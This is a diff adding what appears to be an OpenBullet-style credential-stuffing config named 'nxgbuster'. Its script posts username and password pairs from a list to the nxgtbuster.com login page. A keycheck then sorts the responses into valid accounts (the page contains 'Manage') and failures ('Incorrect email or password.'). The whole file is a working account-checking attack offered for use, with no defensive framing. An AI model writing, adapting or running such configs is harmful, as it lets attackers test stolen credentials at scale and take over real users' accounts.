@@ -1,0 +1,42 @@
+[SETTINGS]
+{
+  "Name": "nxgbuster",
+  "SuggestedBots": 1,
+  "LastModified": "2019-06-01T16:34:22.0695062+03:00",
+  "AdditionalInfo": "",
+  "KeysDB": "",
+  "LocalKeysDB": "",
+  "Author": "3zm4N",
+  "Version": "1.2.0",
+  "IgnoreResponseErrors": false,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#Login REQUEST POST "https://nxgtbuster.com/seo-pro/account/login.php" 
+  CONTENT "email=<USER>&password=<PASS>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "origin: https://nxgtbuster.com" 
+  HEADER "referer: https://nxgtbuster.com/seo-pro/account/login.php" 
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "Manage" 
+  KEYCHAIN Failure OR 
+    KEY "Incorrect email or password." 
